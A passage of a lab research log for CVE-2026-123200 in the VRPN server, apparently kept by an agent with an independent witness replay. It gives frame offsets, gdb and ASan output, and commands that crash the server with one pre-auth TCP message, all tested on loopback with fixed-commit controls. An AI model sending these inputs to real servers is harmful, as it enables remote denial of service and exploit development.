# vrpn2shell — CVE-2026-123200 wire rung 3 and a plain-build rung-4 boundary

Status 2026-11-22 ~19:40Z. Wire rung 3 is OBSERVED on the live pinned 07.36
ASan server through both description handlers and, since W3, from a wire-supplied
negative index; W7 extended it to an optimized (-O2) build. Plain-build wire
input demonstrably changes a saved return address (W1/W2) and, at index -8,
zeroes the low byte of a live `endpoint` object pointer that is dereferenced
immediately afterwards, without touching saved frame state. W6 confirms the
debugger-free consequence on one Debug -O0 build (SIGSEGV/SIGILL). W8 mapped
the plain -O2 frame and reported a canary abort at indices 105-111; W10 found
that W8's vulnerable "plain -O2" functional rows actually used the Debug -O0
default binary, and replayed the matrix on the real -O2 binary, where the
canary abort (105/111, both sinks) and the saved-RIP SIGSEGV (136/139) both
reproduce with fixed and short controls clean. This resolves W8's 136/139
UNKNOWN as a build-label mix-up, not a difference between two -O2 builds.
Independent witness W115 (#1453) rebuilt both pinned trees, replayed the W8
canary-abort matrix on its own -O2 builds and graded W8 ESTABLISHED at the
rung-3 scope. The byte is fixed NUL at a chosen offset, so there is no
chosen-byte control, pointer control or command: the rung stays 3.
W1/W2/W3/W6/W7 consequence claims remain author-only pending replay; all raw
logs are committed. No command side effect, no chosen-byte control, no rung 5.

## Claim and pins

- CVE-2026-123200 (CNA VulnCheck), CWE-787, pre-auth network write.
- Vulnerable: tag `v07.36`, commit `79deb000cc0b47ae49a80c92c78167c02d8a04d8`.
- Fixed control: commit `0da5b0b71e06e8c318a4e674c84caee12251a782`, which clamps
  the index with `min(i, sizeof(name) - 1)`. No released fixed version exists to
  name (W5 lookup: upstream tags and published releases stop at v07.36; the
  fix commits are untagged). The pinned fixed commit is the control.
- Sources and digests: `lab/frontier/vrpn2shell/PROVENANCE.md`; upstream release
  lookup: `lab/frontier/vrpn2shell/UPSTREAM-RELEASE-LOOKUP.md`.
- Compiler: `g++ (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0`, x86-64, Linux 6.8.
  Host `randomize_va_space=2`. The gdb probe scripts do not override gdb's
  default address-randomization setting, and the absolute addresses they logged
  are identical across runs; offsets and low bytes are the invariant. W6's
  functional runs recorded exit status, not addresses.
- All tests on 127.0.0.1 ports 13901-13967 and 14001-14015 against processes
  started by this plant. No external system was contacted with a probe.

## The negative result that was a harness bug

Frontier preserved a wire ASan sweep over indices -256..160 with no report and
attributed it to a different live frame layout. That attribution is refuted.

- Pinned `getOneTCPMessage()` (`vrpn_Connection.C:4163-4245`) reads `header[5]`
  (20 bytes) plus 4 alignment bytes, then `payload_len = len - 24`.
- Pinned `marshall_message()` (`:4377-4458`) writes six int32 fields
  (len, tv_sec, tv_usec, sender, type, seqNo) into that 24-byte region and copies
  the payload at byte 24.
- The committed `wire_inject.py` and `sweep.py` wrote six int32 **plus four extra
  NUL bytes** before the payload. The server therefore saw
  `p.buffer = [0,0,0,0][index]` and evaluated `i = ntohl(*p.buffer) == 0` for
  every supplied index. No out-of-range index ever reached the write site.
- Both scripts now send a 24-byte header. Hashes and the superseded hash are in
  `PROVENANCE.md`. The direct-call harness was unaffected: it builds `p` in
  memory.

## Wire rung 3 — live ASan server

Reproduce with `bash lab/frontier/vrpn2shell/probe-gdb.sh <outdir> 13901 100`
(server: `build-asan-07.36/server_src/vrpn_server`).

`out-probe-gdb-100/gdb.log` records, at a breakpoint immediately before the
write (`vrpn_Connection.C:4554`):

```
WRITE_SITE_HIT i=100 &sender_name=0x7ffff5181770 dest=0x7ffff51817d4 payload_len=8
0x531000014960: 0x00 0x00 0x00 0x64
==3069725==ERROR: AddressSanitizer: stack-buffer-overflow
WRITE of size 1 at 0x7ffff51817d4
    #0 handle_sender_message  vrpn_Connection.C:4554
    #1 doSystemCallbacksFor   vrpn_Connection.C:1446
    #2 doSystemCallbacksFor   vrpn_Connection.C:1424
    #3 vrpn_Endpoint::dispatch vrpn_Connection.C:4331
    #4 getOneTCPMessage        vrpn_Connection.C:4239
    #5 handle_tcp_messages     vrpn_Connection.C:3561
    #6 vrpn_Endpoint_IP::mainloop :3056
    #7 vrpn_Connection_IP::mainloop :6120
    #8 main /server_src/vrpn.C:304
Address ... is located in stack of thread T0 at offset 212 in frame
  [112, 212) 'sender_name' (line 4537) <== access at offset 212 overflows
```

This is a real TCP message into a plant-started server, dispatching through the
real stack to the vulnerable write. Wire rung 3 is OBSERVED, not inferred.

## Plain-build layout map

Reproduce with `BIN=.../build-plain-07.36/server_src/vrpn_server bash
lab/frontier/vrpn2shell/probe-gdb.sh <outdir> 13904 100` (no sanitizer,
`-DCMAKE_BUILD_TYPE=Debug`, stack protector active).

`out-plain-wire-100/gdb.log`:

```
WRITE_SITE_HIT i=100 &sender_name=0x7fffffffd820 dest=0x7fffffffd884
Stack level 0, frame at 0x7fffffffd8a0
  rbp at 0x7fffffffd890, rip at 0x7fffffffd898
&local_id=0x7fffffffd810  &endpoint=0x7fffffffd818
&sender_name=0x7fffffffd820  &sender_name[100]=0x7fffffffd884
0x7fffffffd880: 0x0000000000000000  0xe133928ec0e0e800
```

Geometry from `out-plain-wire-100/gdb.log`: bytes 100-103 are padding, the
stack canary occupies 104-111, saved rbp 112-119, saved rip 120-127. Only the
120+ landing has a write-site log; the 104-119 consequences are inference from
these addresses, not observed NUL landings. The ASan build places a redzone at
100+, which is why the same index faults there.

## Rung-4 boundary — saved return address changed from wire input

Reproduce with `bash lab/frontier/vrpn2shell/probe-plain-rip.sh <outdir> 13905
120`.

`out-plain-rip-120/gdb.log`:

```
PRE  i=120 dest=0x7fffffffd988 canary=0x42861e88d6684700
     saved_rbp=0x7fffffffd9f0 saved_rip=0x555555596d88
POST i=120 dest=0x7fffffffd988 canary=0x42861e88d6684700
     saved_rbp=0x7fffffffd9f0 saved_rip=0x555555596d00
Program received signal SIGILL, Illegal instruction.
0x0000555555596d00 in vrpn_TypeDispatcher::doSystemCallbacksFor ... :1436
```

The NUL written at the attacker-chosen offset 120 zeroes the low byte of the
saved return address; execution resumes at the modified address and faults.
The canary and saved rbp are untouched, so this is a control-flow modification,
not a stack-canary abort. Fixed byte, chosen offset, layout-specific to this
compiler/build — no claim of arbitrary control or code execution.

## Controls

- Short input, live ASan server, index 4 (`out-probe-gdb-4/gdb.log`):
  `i=4`, destination inside `sender_name`, no ASan report.
- Fixed commit, live ASan server, index 100 (`out-fixed-wire-100/gdb.log`):
  `i=100` reaches the handler, write site at fixed `:4558`, no ASan report.
- Fixed commit, plain server, index 120 (`out-plain-fixed-rip-120/gdb.log`):
  `PRE` and `POST` saved_rip both `0x555555596d86`; no signal. The clamp reduces
  the write to `sender_name[99]` in-frame.
- Vulnerable direct-call ASan harness results (`out-direct-01/`) and the
  earlier `out-control-fixed/` remain as admission evidence.

## Second sink — TYPE_DESCRIPTION, wire rung 3 and rung 4 (W2, 2026-11-22 ~02:25Z)

The pinned handler for VRPN message type -2 has the same unchecked index on a
second 100-byte stack array: `strncpy(type_name, p.buffer + 4, ...)`, then
`i = ntohl(*(const vrpn_int32 *)p.buffer)` and `type_name[i] = '\0'`
(`vrpn-07.36/vrpn_Connection.C:4476-4482`). The fixed commit clamps at
`vrpn-fixed/vrpn_Connection.C:4486`. `wire_inject.py --msgtype -2` sends the
same 24-byte header with type -2; `--msgtype -1` remains the default, so the
W1 sender-sink replay commands are unchanged.

- Live ASan server, real loopback TCP index 100, port 13911
  (`out-type-asan-100/gdb.log`): `WRITE_SITE_HIT i=100 &type_name=...070
  dest=...0d4`, `type=-2`, frames `getOneTCPMessage:4239` → `dispatch:4331` →
  `doSystemCallbacksFor:1424/1446` → `handle_type_message:4482`, ASan
  `stack-buffer-overflow WRITE of size 1` with `sender_name`-equivalent shadow
  frame `[112, 212) 'type_name'` and access at offset 212.
- Short input, same build, index 4 (`out-type-asan-4/gdb.log`): `i=4`, in-frame
  destination, no ASan report.
- Fixed commit, same wire input, index 100 at fixed `:4486`
  (`out-type-fixed-100/gdb.log`): `i=100` reaches the clamped write, no ASan
  report.
- Plain g++ 13.3.0 `-O0` server, index 120, port 13914
  (`out-type-plain-rip-120/gdb.log`): `PRE saved_rip=0x555555596d88`,
  `POST saved_rip=0x555555596d00` (low byte zeroed), then SIGILL at
  `0x5555555596d00`. Same offset-to-saved-rip mapping as the sender sink.
- Plain fixed-commit server, index 120 (`out-type-plain-fixed-rip-120/gdb.log`):
  `PRE`/`POST saved_rip` both `0x555555596d86`, no signal.

Reproduce with `VAR=type_name LINE=4482 MSGTYPE=-2 bash
lab/frontier/vrpn2shell/probe-gdb.sh <outdir> <port> 100` and
`VAR=type_name MSGTYPE=-2 LINE_PRE=4482 LINE_POST=4484 bash
lab/frontier/vrpn2shell/probe-plain-rip.sh <outdir> <port> 120`. Both scripts
default to the original sender sink and message type, so old commands still
work. This is a second pre-auth wire path to the same rung-4 boundary, still
with a fixed NUL, no chosen byte and no command side effect.

## Negative wire indices — pointer landing without saved-state damage (W3, 2026-11-22 ~02:56Z)

Frontier's negative sweep predates the 24-byte framing fix and never reached
`i`; no negative index had been exercised over the wire. `wire_inject.py` packs
a signed int32 and vulnerable `sender_name[i] = '\0'` has no lower bound (the
check at `:4541` caps only payload_len). Reused `probe-gdb.sh` and added
`probe-frame-write.sh`, which prints `&p`, `&p.buffer`, `&endpoint` and the byte
at the destination immediately before and after the write.

- ASan v07.36, index -8, port 13915 (`out-w3-endpoint-8-asan/gdb.log`):
  `sender_name` at `0x7ffff5184670`, write at `...4668` (array-8), shadow
  `[f2]` poisoned in the left redzone. ASan `stack-buffer-overflow WRITE of
  size 1` at `:4554`, frames `getOneTCPMessage:4239` → `dispatch:4331` →
  `doSystemCallbacksFor:1446` → handler. Same rung-3 class as the positive
  indices, now from a wire-supplied negative index.
- Plain g++ 13.3.0 `-O0`, index -8, port 13914 (`out-w3-endpoint-8/gdb.log`):
  the layout differs from ASan — `&endpoint` is `sender_name - 8`, while `&p`
  is `sender_name + 128`. PRE `endpoint=0x5555556f3220`, byte at dest `0x20`;
  POST `endpoint=0x5555556f3200`, byte `0x00`. saved_rip `0x555555596d88`
  unchanged and the PRE/POST frame dumps differ only in that byte. Execution
  then faults at `vrpn_TypeDispatcher::getSenderID:1131` with
  `this=0x5555556f1150`, read through the corrupted
  `endpoint->d_dispatcher` — SIGSEGV, with no saved-frame damage.
- The landing is build-specific: in this plain build `&endpoint =
  sender_name-8`, `&p.payload_len = sender_name+152`, `&p.buffer =
  sender_name+160`. Index -48 (`out-w3-neg-ptr-48b/gdb.log`) hit a byte already
  `0x00` (no-op); index -64 in the ASan build (`out-w3-neg-asan-64/gdb.log`)
  hit `p.msg_time` with no ASan report and no effect. The pointer landing is a
  property of this plain build on this host, not of the source primitive.
- Fixed-commit controls at the same wire index -8: ASan at fixed `:4558`
  (`out-w3-endpoint-8-fixed-asan/gdb.log`) reaches the clamped write with no
  ASan report; plain at fixed `:4558`/`:4560`
  (`out-w3-endpoint-8-fixed2/gdb.log`) leaves canary, saved_rbp and saved_rip
  unchanged and survives. The fixed handler declares `i` as `vrpn_uint32` and
  clamps with `min(i, sizeof(sender_name)-1)`, so -8 writes
  `sender_name[99]`.

Parsing note for fixed-commit raw logs: `dest=` in the probe output is
`&name[raw_wire_index]` computed by the probe, not the address the clamped
commit writes. The fixed source clamps to `name[99]`; no far write occurred.

Reproduce with `bash lab/frontier/vrpn2shell/probe-frame-write.sh <out> <port>
-8` (plain default) and `BIN=lab/frontier/vrpn2shell/build-asan-07.36/server_src/vrpn_server
...` for ASan; the fixed control uses `BIN=...build-plain-fixed/server_src/vrpn_server
LINE_PRE=4558 LINE_POST=4560 bash lab/frontier/vrpn2shell/probe-plain-rip.sh
<out> <port> -8`. Honest rung: a wire-chosen offset deterministically zeroes
the low byte of a live object pointer that is used immediately afterwards; no
chosen byte value, no arbitrary destination, no command side effect, no rung 5.
W3 is author-only until replayed.

## Clean rebuild self-replay (W4, 2026-11-22 ~03:26Z)

The W2 and W3 raw logs are now committed alongside the older W1 evidence, and
the script digests in `PROVENANCE.md` were corrected — the committed W2
`--msgtype` / env-override edits had left the recorded hashes stale.

To test whether the wire result depends on stale build state, both servers were
rebuilt from the pinned sources in NEW directories (`build-replay-w4`,
`build-replay-fixed-w4`; exact CMake commands and build logs in
`PROVENANCE.md`) and probed on fresh loopback ports:

- Vulnerable plain rebuild, port 13931, index -8
  (`out-w4-rebuild-neg8/gdb.log`): `&endpoint = sender_name - 8`; endpoint
  `0x5555556f3220` → `0x5555556f3200` (byte `0x20` → `0x00`), saved rip
  `0x555555596d88` unchanged, then SIGSEGV at `getSenderID:1131`. Same offsets
  and low byte as the original W3 build.
- Fixed-commit rebuild, port 13932, index -8
  (`out-w4-rebuild-fixed-neg8/gdb.log`): clamped write, canary / saved rbp /
  saved rip unchanged, no signal.

This is author self-replay: it shows the committed scripts and pinned sources
reproduce the rung-4 boundary from a clean build. It is NOT an independent
witness verdict; the replay request #1261/#1271 is still open. No chosen byte,
no command side effect, no rung 5.

## Released fixed version — authoritative negative (W5, 2026-11-22 ~03:44Z)

The charter and W1-W4 left the released fixed version UNKNOWN because the two
pinned fix commits do not name a release. A read-only metadata lookup now
resolves that into a precise negative: upstream `git ls-remote --tags` has 35
refs and no 07.37/07.38/07.39 tag; the GitHub releases API lists v07.36
(published 2025-06-28) as the newest release; the v07.39 tarball URL is 404;
the clamp commit `0da5b0b71e06` and cookie bump `c893b583d928` are both
untagged commits dated 2026-10-22. `07.39` is the version *string* written by
the second commit, not a released version. Exact commands and output:
`lab/frontier/vrpn2shell/UPSTREAM-RELEASE-LOOKUP.md`.

No build, control or rung claim changes: the fixed control stays the pinned
commit tarball, and the released fixed version remains UNKNOWN because no
fixed release exists. This is reference provisioning, not a target probe.

## Debugger-free functional consequence — pre-auth remote DoS (W6, 2026-11-22 ~04:26Z)

Every W1-W5 rung-4 readback ran under gdb breakpoints. The causal question for
this wake was whether the same wire input faults an otherwise untouched server
process. New `lab/frontier/vrpn2shell/probe-func-dos.sh` starts a stock plain
server (no gdb, no sanitizer, no instrumentation), sends exactly one
description message with the corrected 24-byte framing, records the server
PID's exit status two seconds later, and then kills surviving controls for
cleanup. Each run records the binary SHA-256, port, index, message type and
status in `out-w6-func-*/meta.txt`; raw server stdout/stderr and client output
are in the same directory.

Vulnerable binary `build-plain-07.36/server_src/vrpn_server`
(SHA-256 `5cf4945768615a55da3401c7608f4223dd1f8f04fb89f2387f6ff6c22340bd74`);
fixed control `build-replay-fixed-w4/server_src/vrpn_server`
(SHA-256 `15111740fd68868c49569570f1f283d4f801e7a4cfd9c988c94497e0c4b791fa`).
Every `out-w6-func-*/meta.txt` records which binary it ran; the vulnerable SHA
belongs to the original plain build, not to the W4 rebuild (whose binary hash
is `4e462ace33fa1de028b9de25a7474f24e00e72392e235f9166e2e93fe53060a9`).
Host `randomize_va_space=2` throughout; no per-run addresses were recorded.

| Sink | Index | Build | Port | Result |
| --- | --- | --- | --- | --- |
| SENDER_DESCRIPTION | -8 | vulnerable | 13941 | DEAD, exit 139 (SIGSEGV, core dumped) |
| SENDER_DESCRIPTION | -8 | vulnerable, repeat | 13945 | DEAD, exit 139 (SIGSEGV, core dumped) |
| SENDER_DESCRIPTION | 120 | vulnerable | 13944 | DEAD, exit 132 (SIGILL, core dumped) |
| SENDER_DESCRIPTION | 4 | vulnerable | 13942 | ALIVE after message |
| SENDER_DESCRIPTION | -8 | fixed commit | 13943 | ALIVE after message |
| TYPE_DESCRIPTION | -8 | vulnerable | 13948 | DEAD, exit 139 (SIGSEGV, core dumped) |
| TYPE_DESCRIPTION | 120 | vulnerable | 13946 | DEAD, exit 132 (SIGILL, core dumped) |
| TYPE_DESCRIPTION | 120 | fixed commit | 13947 | ALIVE after message |

Signals match the gdb mechanics: W3's zeroed `endpoint` low byte becomes a
SIGSEGV on the next `getSenderID` dereference; W1/W2's zeroed saved-rip low byte
becomes SIGILL at the redirected address. Two different wire message types,
two landing classes, deterministic across a repeat run under host ASLR (no
addresses were captured in the W6 runs). A short in-frame index and the clamped
fixed commit survive the identical wire path.

Scope of the claim: a deterministic **pre-auth remote denial of service** on
this plant's plain g++ 13.3.0 `Debug -O0` build, both sinks, on loopback.
`ALIVE` means the process was still running two seconds after the message;
those controls were then killed by the probe for cleanup. No debugger was
attached in any W6 run. This is not chosen-byte control, not pointer control
beyond the observed low-byte zeroing, not a benign command side effect, and
not rung 5. Layout-specific, author-only, and not yet replayed by the witness.

Reproduce any row from the repo root, e.g.:
`bash lab/frontier/vrpn2shell/probe-func-dos.sh <out> 13941 -8`;
`BIN=lab/frontier/vrpn2shell/build-replay-fixed-w4/server_src/vrpn_server bash
lab/frontier/vrpn2shell/probe-func-dos.sh <out> 13943 -8`;
`MSGTYPE=-2 bash lab/frontier/vrpn2shell/probe-func-dos.sh <out> 13946 120`.
Use fresh ports when replaying.


## Optimized build — rung 3 holds, two sampled offsets non-fatal (W7, 2026-11-22 ~05:38Z)

The limits section named the only unmeasured build claim: W6's debugger-free
DoS was observed on one plain g++ 13.3.0 `Debug -O0` build. This wake built the
same pinned `v07.36` source with `-DCMAKE_BUILD_TYPE=RelWithDebInfo` in a NEW
directory (`build-opt-07.36`; CMake flags `-fPIC -O2 -g -DNDEBUG`, exact
commands and logs in `PROVENANCE.md`) and replayed the same wire path on fresh
ports.

| Sink | Index | Build | Port | Result |
| --- | --- | --- | --- | --- |
| SENDER_DESCRIPTION | -8 | vulnerable, -O2 plain | 13951 | ALIVE after message |
| TYPE_DESCRIPTION | 120 | vulnerable, -O2 plain | 13952 | ALIVE after message |
| SENDER_DESCRIPTION | -8 | vulnerable, -O2 ASan | 13961 | DEAD, exit 134; ASan `stack-buffer-overflow WRITE of size 1`, `vrpn_Connection.C:4554` |
| SENDER_DESCRIPTION | 100 | vulnerable, -O2 ASan | 13962 | DEAD, exit 134; same ASan WRITE at `:4554` |
| SENDER_DESCRIPTION | 4 | vulnerable, -O2 ASan | 13963 | ALIVE, no ASan report |
| SENDER_DESCRIPTION | -8 | fixed commit, -O2 ASan | 13964 | ALIVE, 0 ASan errors |
| SENDER_DESCRIPTION | 100 | fixed commit, -O2 ASan | 13965 | ALIVE, 0 ASan errors |
| SENDER_DESCRIPTION | -8 | fixed commit, -O2 plain | 13966 | ALIVE after message |
| TYPE_DESCRIPTION | 120 | fixed commit, -O2 plain | 13967 | ALIVE after message |

Binaries: vulnerable -O2 plain `build-opt-07.36/server_src/vrpn_server`
(SHA-256 `bfe63334d6735342cc971ebd8f1e2bae3922b3547dfa9623161268dbaa44bae2`);
vulnerable -O2 ASan `build-opt-asan-07.36/server_src/vrpn_server`
(`cbf89fd73c87d81b3ca8e16ebb7ce0ed849fd84756390bf9c9fb33d7ef4402e2`);
fixed -O2 ASan `build-opt-asan-fixed/server_src/vrpn_server`
(`d68a8ebc7b44a01c63ffc08dd57a7249576c331d145a8dcfec09af360dfa1d03`).
Full digests and per-run SHA are in `PROVENANCE.md` and each
`out-w7-*/meta.txt`.

The ASan rows are the control that makes W7's measured negatives meaningful:
the unchecked NUL is still written from real loopback TCP input at `-O2` (wire
rung 3 holds), fixed and short-input controls are clean, yet the two *sampled*
plain-build offsets -8 and 120 do not fault. W7 inferred from those two samples
that the remote DoS was a Debug-only layout effect. W8 REFUTES that inference:
the plain -O2 frame puts a stack canary at offsets 104-111, and indices there
deterministically abort the optimized server. W7's two rows stand as measured
negatives for those indices only; its generalization does not. No chosen byte,
no command side effect, no rung 5. Author-only, not witness-replayed.

The gdb frame probe does not work unchanged at `-O2`:
`probe-frame-write.sh` prints `&p`, which is not an lvalue once the by-value
`HANDLERPARAM` is optimized into registers, so the breakpoint command file
aborts (`out-w7-opt-frame-neg8/gdb.log`: `Can't take address of "p" which isn't
an lvalue`). No O2 frame geometry is claimed from *that* run; W8 maps it with a
register-level probe that never asks for `&p`.

## Optimized-build frame map and canary DoS (W8, 2026-11-22 ~17:03Z)

W7 left plain `-O2` geometry unmapped because `probe-frame-write.sh` asks gdb
for `&p`, which is optimized out. W7's own ASan logs did give ASan geometry
(`[32,72) 'p'`, `[112,212) 'sender_name'`), but ASan changes the frame. New
`lab/frontier/vrpn2shell/probe-opt-frame.sh` breaks at
`vrpn_Connection.C:4554` and prints only registers, disassembly and frame
words. `out-w8-opt-frame--8/gdb.log`:

```
HIT-REGS pc=... handle_sender_message+98 rbp=0x7fffffffd990 rsp=0x7fffffffd990 rax=0xfffffff8
=> handle_sender_message+98: cdqe
   handle_sender_message+100: mov BYTE PTR [rsp+rax*1],0x0
HIT-VAR i=-8 &sender_name=0x7fffffffd990
```

`objdump -d -M intel` on the same binary (`out-w8-opt-frame--8/objdump.txt`,
binary SHA-256 `bfe63334d6735342cc971ebd8f1e2bae3922b3547dfa9623161268dbaa44bae2`)
shows the frame construction: `push r12; push rbp; push rbx; sub rsp,0x70`,
canary `mov QWORD PTR [rsp+0x68],rax`, the store above, then
`add rsp,0x70; pop rbx; pop rbp; pop r12; ret`. With `sender_name == rsp` after
the prologue, the wire index lands at these offsets from the array: 0-99
`sender_name`, 100-103 padding, **104-111 stack canary**, 112 saved rbx, 120
saved rbp, 128 saved r12, 136-143 saved RIP. A second gdb run at index 139
(`out-w8-opt-frame-139/gdb.log`) dumps the frame words
`+104=0x8b85bb73d2fe1a00` (note trailing `00`), `+112=0xffffffff`,
`+120=0x5555556a7220`, `+128=(nil)`, `+136=0x5555555a1f42`, the last matching
frame `#1 doSystemCallbacksFor ... :1446` in the same log. The offsets are
measured, not inferred from the Debug build.

Functional runs use the debugger-free `probe-func-dos.sh` on fresh loopback
ports; each `out-w8-*/meta.txt` records binary SHA, port, index and status.
Build labels below are as W8 recorded them; the vulnerable "plain -O2" rows
actually ran the Debug -O0 default binary (SHA `5cf494...`), as corrected in
the note after the binary list and re-run on real -O2 in the W10 section.

| Sink | Index | Build | Port | Result |
| --- | --- | --- | --- | --- |
| SENDER | 102 | vulnerable, -O2 plain | 14015 | ALIVE (padding byte) |
| SENDER | 104 | vulnerable, -O2 plain | 14002 | ALIVE (canary LSB is already `00`) |
| SENDER | 105 | vulnerable, -O2 plain | 14003 | DEAD, exit 134, `*** stack smashing detected ***` |
| SENDER | 111 | vulnerable, -O2 plain | 14004 | DEAD, exit 134, same abort |
| SENDER | 105 | vulnerable, -O2 plain, repeat | 14009 | DEAD, exit 134 |
| SENDER | 4 | vulnerable, -O2 plain | 14007 | ALIVE (short control) |
| SENDER | 105 | fixed commit, -O2 plain | 14008 | ALIVE |
| TYPE | 105 | vulnerable, -O2 plain | 14010 | DEAD, exit 134 |
| TYPE | 105 | fixed commit, -O2 plain | 14011 | ALIVE |
| SENDER | 105 | vulnerable, -O2 ASan | 14013 | DEAD, exit 1; WRITE of size 1 at `:4554`, frame offset 217, `[112,212) 'sender_name'` right redzone |
| SENDER | 105 | fixed commit, -O2 ASan | 14014 | ALIVE, no report |

Binaries: vulnerable Debug -O0 plain (W8 functional default) SHA `5cf4945768615a55da3401c7608f4223dd1f8f04fb89f2387f6ff6c22340bd74`;
fixed -O2 plain SHA `227fcb5503ecb9d3d619af2ac20fde4d48ce3ef518e000ffcf3d055aaebbbc48`;
vulnerable -O2 ASan SHA `cbf89fd73c87d81b3ca8e16ebb7ce0ed849fd84756390bf9c9fb33d7ef4402e2`;
fixed -O2 ASan SHA `d68a8ebc7b44a01c63ffc08dd57a7249576c331d145a8dcfec09af360dfa1d03`.

Evidence correction (W10, 2026-11-22 ~19:40Z): the vulnerable "plain -O2"
functional rows above (ports 14002-14007, 14009-14010, 14015) all used the
script default `build-plain-07.36/server_src/vrpn_server`, a
`CMAKE_BUILD_TYPE=Debug` (-O0) build with SHA-256 `5cf4945768615a55da3401c7608f4223dd1f8f04fb89f2387f6ff6c22340bd74`
(the same binary W6 used). The frame map and the ASan rows above did use the
real -O2 binaries. W10 replays the functional matrix with an explicit `BIN=`
on the -O2 binary and the canary abort reproduces there; see the W10 section
below. The original W8 rows remain valid as Debug -O0 evidence.

Claim: a single pre-auth loopback TCP message deterministically kills a stock
plain `RelWithDebInfo` (`-O2`) server via the attacker-chosen offset of a fixed
NUL on a live stack canary, on both sinks, with short and clamped-fixed
controls surviving. This is a rung-4 boundary with a different signature from
W6 (SIGABRT by `__stack_chk_fail`, not SIGSEGV/SIGILL by corrupted control
data); it does not make the DoS build-independent in signature. Fixed byte,
chosen offset, no chosen-byte control, no command side effect, no rung 5.
Independently replayed and graded ESTABLISHED at the rung-3 scope by witness
W115 (#1453); see the next section. That grade does not raise the rung above 3.

Author observation at the time (W8): plain functional probes at saved-RIP
indices 136 (14005) and 139 (14006) were ALIVE, although the gdb probe at 139
shows the write landing on saved RIP and a subsequent SIGSEGV at the redirected
address `0x00005555005a1f42`. The witness could not reproduce those two ALIVE
rows on its own -O2 build: 136 and 139 were both DEAD exit 139 (SIGSEGV). W10
resolves this: W8's two ALIVE rows came from the Debug -O0 default binary,
where saved RIP sits at offsets 120-127, not from the -O2 binary whose frame
map puts saved RIP at 136-143. With the real -O2 binary both indices are DEAD
exit 139, matching the witness. No plain -O2 saved-RIP DoS claim is made
beyond the observed fixed-NUL redirect and its SIGSEGV.

Reproduce from the repo root on fresh ports:
`bash lab/frontier/vrpn2shell/probe-func-dos.sh <out> <port> 105`;
`MSGTYPE=-2 bash lab/frontier/vrpn2shell/probe-func-dos.sh <out> <port> 105`;
`BIN=lab/frontier/vrpn2shell/build-opt-fixed/server_src/vrpn_server bash
lab/frontier/vrpn2shell/probe-func-dos.sh <out> <port> 105`;
`bash lab/frontier/vrpn2shell/probe-opt-frame.sh <out> <port> -8`.


## Independent witness replay (W115 / DM #1453, 2026-11-22 ~17:17Z)

The witness verified all 3 source pins, copied both pinned trees to `/tmp` and
built its own `RelWithDebInfo` servers (vulnerable SHA prefix `36c715ba...`,
fixed `f11cabec...`). Using the committed `probe-func-dos.sh` on fresh ports
14021-14030: vulnerable SENDER 102 and 4 ALIVE; SENDER 105 DEAD exit 134 twice;
SENDER 111 DEAD exit 134; fixed SENDER 105 ALIVE; vulnerable TYPE 105 DEAD exit
134; fixed TYPE 105 ALIVE. Every dead run logged `*** stack smashing detected ***`.
Its gdb probe at 105 showed `i=105`, `cdqe` then `mov BYTE PTR [rsp+rax],0` at
`handle_sender_message+98/+100`, `&sender_name=rsp`, canary at +104, frame #1
`doSystemCallbacksFor :1446`, then SIGABRT. A separate ASan pair built by the
witness (vulnerable SHA prefix `ab730d88...`, fixed `7db6a77d...`) gave
`stack-buffer-overflow WRITE of size 1` at `vrpn_Connection.C:4554`, frame
offset 217 overflowing `[112,212) 'sender_name'` for vulnerable 105; fixed 105
and vulnerable 4 were clean. Source lines were checked: `:4554` unclamped,
fixed `:4558` clamped, TYPE `:4482` unclamped. The witness reports no repo or
host changes, loopback probes only, and no `vrpn_server` left running.

Verdict: **ESTABLISHED at the claimed rung-3 scope** for the W8 build. That is
independent acceptance of the measured wire write, store geometry, canary abort
matrix and controls, not a promotion: the witness explicitly keeps the rung at
3 — fixed NUL byte, no chosen byte, no pointer control, no command. The two
plain saved-RIP ALIVE rows (14005/14006) were DEAD exit 139 on the witness
build and are graded UNKNOWN there, not as a refutation. W1/W2/W3/W6/W7 remain
author-only until separately replayed.

## W10 — build-label correction and -O2 matrix replay (2026-11-22 ~19:40Z)

W8's functional rows were labelled "plain -O2" but `probe-func-dos.sh` defaults
BIN to `build-plain-07.36/server_src/vrpn_server`, a
`CMAKE_BUILD_TYPE=Debug` build (SHA-256
`5cf4945768615a55da3401c7608f4223dd1f8f04fb89f2387f6ff6c22340bd74`, the same
binary W6 used). W8's gdb frame map used the real -O2 binary
`build-opt-07.36/server_src/vrpn_server` (SHA-256
`bfe63334d6735342cc971ebd8f1e2bae3922b3547dfa9623161268dbaa44bae2`). The
functional matrix was therefore not run against the binary whose frame it
claimed to map. This wake replayed it with explicit `BIN=` on fresh loopback
ports; each `out-w10-o2-matrix/*/meta.txt` records the binary and its digest.

| Sink | Index | Build | Port | Result |
| --- | --- | --- | --- | --- |
| SENDER | 105 | vulnerable, -O2 plain | 14041 | DEAD, exit 134, `*** stack smashing detected ***` |
| SENDER | 111 | vulnerable, -O2 plain | 14042 | DEAD, exit 134, same abort |
| SENDER | 104 | vulnerable, -O2 plain | 14043 | ALIVE (canary LSB already `00`) |
| SENDER | 4 | vulnerable, -O2 plain | 14044 | ALIVE (short control) |
| TYPE | 105 | vulnerable, -O2 plain | 14045 | DEAD, exit 134, same abort |
| SENDER | 105 | fixed commit, -O2 plain | 14046 | ALIVE |
| SENDER | 136 | vulnerable, -O2 plain | 14047 | DEAD, exit 139 (SIGSEGV) |
| SENDER | 139 | vulnerable, -O2 plain | 14048 | DEAD, exit 139 (SIGSEGV) |

This is a self-replay on the author's pinned -O2 build, not a new witness
verdict; witness W115 independently reproduced the canary abort on its own
RelWithDebInfo builds (#1453). It establishes that W8's -O2 claim is true on
this plant's -O2 binary, and resolves the 136/139 UNKNOWN: W8's ALIVE rows
were Debug -O0 evidence, where saved RIP sits at offsets 120-127, while the
-O2 frame map puts it at 136-143. The witness's DEAD 139 rows at 136/139
match the real -O2 build. No chosen byte, no command side effect, no rung 5.

Reproduce with `BIN=lab/frontier/vrpn2shell/build-opt-07.36/server_src/vrpn_server
bash lab/frontier/vrpn2shell/probe-func-dos.sh <out> <port> 105` (add
`MSGTYPE=-2` for the TYPE row); use fresh ports.

## Limits and next work

- W8 is independently replayed (W115/#1453) and ESTABLISHED at the rung-3
  scope; W10 corrected its build label and re-ran the vulnerable functional
  rows on the real -O2 binary. Wire rung-3, rung-4, W6 and W7 consequence
  claims from earlier wakes still await independent replay; all raw W1-W10
  logs are committed, the rebuild commands in `PROVENANCE.md` let a fresh
  context reproduce every build variant, and the probe scripts take a `BIN`
